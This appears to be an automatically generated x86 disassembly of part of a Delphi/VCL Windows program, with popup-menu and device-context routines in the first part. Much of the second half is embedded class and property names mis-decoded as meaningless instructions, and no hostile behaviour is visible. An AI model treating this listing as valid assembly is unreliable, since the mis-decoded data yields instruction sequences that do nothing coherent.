mov cl 0x1
call sub_450b00
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414108
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414108
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_450b00
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414108
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414108
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_450b30
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414108
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414108
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_450b30
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_45d85c
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_45d8c4
jmp r-xdata
sub_451c9b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_451d54
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_413fac
pop esi
pop ebx
retn
push ebx
push sub_4517c4
call sub_41bbc8
mov [ ebx + 0x10 ] eax
sub_451d98
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_450918
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_451d54
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_451e0c
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_451d7c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4509b4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_451e64
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_44ccb0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_451620
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_451620
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_451eac
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_44ccb0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c408
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403320
mov edx eax
jmp r-xdata
sub_451ef8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_412cac
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_451e64
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_45026c
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_450768
mov eax [ ebx + 0x34 ]
call sub_44db10
mov eax ebx
call sub_451110
mov eax ebx
call sub_451eac
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_44dc40
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_451fac
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_414108
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_414108
cmp ebp [ eax ]
jne r-xdata
sub_451fe8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41e64c
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_41de80
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_41e64c
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_41de80
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403320
mov edx [ r-xdata ]
call sub_4032b0
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41e64c
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_41de80
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_4520d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403f4c
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_4041b8
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_404458
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_4041b8
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_404458
jmp r-xdata
sub_452164
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403ef8
mov ebx 0x1
mov eax esi
call sub_4041b8
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_4040e0
sub_4521c8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_452221
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4520d0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4520d0
mov eax [ ebp - 0x8 ]
pop edx
call sub_407d5c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452228
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
sub_452299
cdq
inc edi
add [ esp + ecx * 4 + 0x47 ] ch
add [ ebx + ebx * 4 ] al
inc edi
add [ eax - 0x74 ] ch
inc edi
add ah al
0x8c640047 0x47
cwde
xchg esi eax
inc edi
add [ eax - 0x74 ] ah
inc edi
add [ esi + edx * 4 - 0x73a3ffb9 ] ch
inc edi
add [ eax ] ah
xchg edi eax
inc edi
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_452328
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45232f
retn
mov eax [ rw-data ]
call sub_403124
mov eax [ rw-data ]
call sub_403124
mov eax [ rw-data ]
call sub_403124
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404980
mov eax rw-data
call sub_403ef8
sub_452334
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403c20
mov eax [ r-xdata ]
call sub_413944
mov eax [ r-xdata ]
call sub_4139e4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413990
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413990
mov eax [ r-xdata ]
call sub_413888
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42551c
mov [ rw-data ] eax
sub_452465
inc esi
inc ecx
add [ eax ] al
dec eax
inc ecx
add [ eax ] cl
dec eax
inc ecx
add [ eax + 0x47 ] dl
inc ebp
add [ ecx ] dl
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
inc eax
and eax [ ebp ]
or [ eax ] al
add bh bh
or [ eax ] al
add bh bh
dec eax
inc edi
inc ebp
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
jb r-xdata
ror [ esp + 0x11070045 ] 0x54
dec esi
inc ebp
add [ ecx ] al
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] sub_41c110
sub [ eax ] al
add bh bh
je r-xdata
insb
inc edx
popad
jb r-xdata
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
inc ebx
outsd
outsb
je r-xdata
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
add [ eax + 0x8 ] al
and al 0x45
add [ eax + 0xd00411c ] dl
add [ 0x6d726f46 ] al
jae r-xdata
popad
outsb
add [ gs : bx + si ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
imul ebp [ esi ] 0x2c004010
add [ eax ] al
call [ eax + 0x100454e ]
inc ebx
outsd
outsb
je r-xdata
mov [ eax * 2 + 0x54110700 ] fs
jae r-xdata
add [ eax ] al
[ 0x1ff0000 ]
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
insb
dec edi
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
mov al 0x4f
inc ebp
add [ ecx ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] ah
add bh bh
xor [ esi + 0x45 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax + edx + 0x40 ] dl
jb r-xdata
and al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x45 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax - 0x27ffbfcd ] al
pop ss
inc esp
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ edx + edx * 2 + 0x47780045 ] bh
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x26 ] dh
inc ebp
add [ eax ] cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
pop es
add [ esi ] al
add [ eax ] al
adc [ eax ] al
or al 0x0
add bh bh
test al 0x4e
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
inc eax
add al dh
inc ebp
add [ eax ] cl
add [ eax ] al
sbb al 0x1c
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
sub [ eax + 0x45 ] bl
add [ eax + 0x14004553 ] cl
push esp
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
inc esp
add [ edx + ebx + 0x44 ] al
add [ ebp + ecx * 2 + 0x38f00044 ] dh
inc esp
add al ah
cmp eax [ eax + eax + 0x68 ]
push ebx
inc ebp
add [ eax ] bl
push esi
inc ebp
add [ eax + ebx * 2 + 0x45 ] cl
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
call [ eax + 0x58 ]
inc ebp
add [ ecx + ebx * 2 ] ch
inc ebp
add [ eax + 0x59 ] dl
inc ebp
inc esp
add [ eax + 0x1c00440f ] ah
inc edi
inc ecx
add [ esi * 8 - 0x36abffbd ] dh
inc edi
dec esi
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
push esp
adc [ eax ] al
cmp [ eax ] al
add bh bh
enter 0x454f 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
add [ eax ] al
je r-xdata
push esi
outsd
insb
nop
sbb [ eax ] ch
inc ebp
add [ edi ] al
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ eax + 0x47 ] bh
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
push [ eax + 0x100454f ]
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsd
outsb
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
clc
dec edi
inc ebp
add [ eax + edx * 2 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
add [ ebx ] al
or al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jb r-xdata
outsd
insb
add al 0x27
inc ebp
add al ah
cwde
inc ebx
add [ 0x6f460500 ] cl
jb r-xdata
inc ebx
add [ esp + edi * 8 + 0x43 ] dl
add [ edx + edx * 8 + 0x43 ] ch
add [ edx + esi * 4 ] al
push esp
leave
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
jb r-xdata
imul ebp [ esi + 0x43 ] 0x72746e6f
sub [ ebp ] al
add edx [ eax ]
push esp
inc esi
outsd
jb r-xdata
jb r-xdata
je r-xdata
add [ 0xffffffff90000000 ] al
jae r-xdata
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ edx + edx * 2 + 0x45 ] al
add [ edx + eax * 2 + 0x47a80044 ] cl
inc esp
add ah dh
inc esi
inc esp
add al cl
mov [ ebx ] sub_443d08
sub [ 0x3a400044 ] bh
inc esp
add [ eax ] dl
mov [ ebx ] sub_43c714
add al 0xf7
inc ebx
add [ eax ] dh
test [ ebx ] r-xdata
mov eax cs
inc ebx
add al ah
rol [ ebx ] cl
pop eax
rol [ ebx ] cl
insb
salc
inc ebx
add [ eax ] bl
aad 0x43
add [ esi + edx + 0x44 ] dh
add [ edi + esi * 8 + 0x3a940043 ] dh
inc esp
add [ eax + 0x3b ] dl
inc esp
add [ esi + esi + 0x44 ] cl
add [ ebx + edi ] dh
inc esp
add [ ecx + ebx * 2 + 0x45 ] dh
add [ eax + 0x53 ] cl
inc ebp
add [ eax ] al
adc [ eax + eax - 0x8 ] eax
push edx
inc ebp
add al ch
or eax 0x53080044
inc ebp
add [ eax - 0x63ffbbef ] bl
adc [ eax + eax + 0x54 ] eax
adc [ eax + eax - 0x4 ] al
cmove eax [ eax ]
je r-xdata
jae r-xdata
add [ ebx ] al
add [ eax ] al
add ah dl
sub [ ebp ] eax
or al 0x62
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x5004528 ] dl
inc esi
outsd
inc edx
outsd
jb r-xdata
inc eax
add [ ecx ] al
jae r-xdata
lea eax [ eax ]
and al 0x29
insb
add [ gs : eax ] eax
add [ eax ] al
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
and al 0x45
add [ eax ] cl
add al [ eax ]
inc [ eax ]
push ebp
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
add [ eax + 0x8004524 ] cl
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
sbb [ eax + 0x45 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ esi + 0x45 ] dh
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
rol [ edi ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
sub [ ebp ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsub [ edi ]
inc ebp
add dh bh
daa
inc ebp
add [ edx + eax ] bl
add [ eax ] al
sub al 0x95
inc ebx
add ah ch
mov cl 0x41
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp + 0x29880040 ]
add bh bh
insd
sub al 0x11
inc ebp
add [ ebx ] al
lea eax [ eax ]
mov [ ecx ] ch
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
jb r-xdata
inc edx
outsd
jb r-xdata
sub [ ebp ] al
add ecx [ esp + edx * 2 ]
insb
inc esi
invd
dec ecx
dec edi
add bh bh
dec [ ebx + 0x452958c0 ]
add [ edi ] cl
outsd
imul esi esp 0x28
inc ecx
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
dec eax
outsd
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc eax
add al bl
sub [ ebp ] eax
add ecx [ ebx ]
push esp
inc edx
outsd
sub [ ebp ] al
push es
bound esi [ ebx + 0x4e ]
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
add eax 0x90000000
inc ebp
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
inc eax
add [ ecx + ebp ] ah
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
add ah ah
pop ecx
inc ebp
add [ eax ] ch
pop eax
inc ebp
jb r-xdata
and al 0x45
add [ edx + eax ] cl
add bh bh
adc [ ebp + 0x45 ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
push cs
jo r-xdata
mov eax eax
sub [ edx ] ch
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ecx + ebp + 0x66080045 ] al
jae r-xdata
push eax
outsd
jae r-xdata
jb r-xdata
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
fsubr [ edx ]
inc ebp
add [ ecx ] cl
insd
inc esp
inc esp
popa
jne r-xdata
jb r-xdata
insb
jns r-xdata
jae r-xdata
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
jae r-xdata
add [ eax ] al
add al bl
sub al [ ebp ]
or [ ebp + ebp * 2 + 0x44 ] esp
je r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
inc ebp
add [ esi ] al
or al 0x54
shr [ eax ] 0x2a
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ edx + ebp ] bh
inc ebp
add [ edx ] cl
jo r-xdata
push es
add eax 0x6d726f46
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
sub [ ebp ] eax
nop
inc eax
add ecx [ ecx ]
push esp
aam 0x29
inc ebp
add [ eax + r-xdata ] dl
popad
dec ebp
je r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
insd
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
sub eax [ ebp ]
push es
inc eax
add al al
outsb
popad
insb
or al 0x70
sub eax [ ebp ]
add ecx [ ebx ]
push es
inc ebp
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
je r-xdata
inc esp
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
js r-xdata
push cs
je r-xdata
jb r-xdata
jo r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
fsubr [ edx ]
inc ebp
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
je r-xdata
add eax 0x6d726f46
jo r-xdata
jo r-xdata
arpl [ ecx + 0x6c ] sp
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + ebp ] ch
inc ebx
outsb
je r-xdata
inc esi
outsd
shr [ ebx ] 0x45
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
or [ esi ] al
outsb
je r-xdata
arpl [ ecx + 0x46 ] sp
jb r-xdata
push es
outsb
je r-xdata
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
outsd
arpl [ ecx + 0x4e ] sp
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ esi ] al
inc ebp
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] cl
inc eax
add [ ebx + ebp + 0x45 ] dh
add [ ebp + 0x2c040040 ] cl
inc ebp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
jns r-xdata
popad
je r-xdata
outsb
inc esi
outsd
jb r-xdata
sub al [ ebp ]
push esp
push eax
dec edi
ja r-xdata
jb r-xdata
insd
popad
outsb
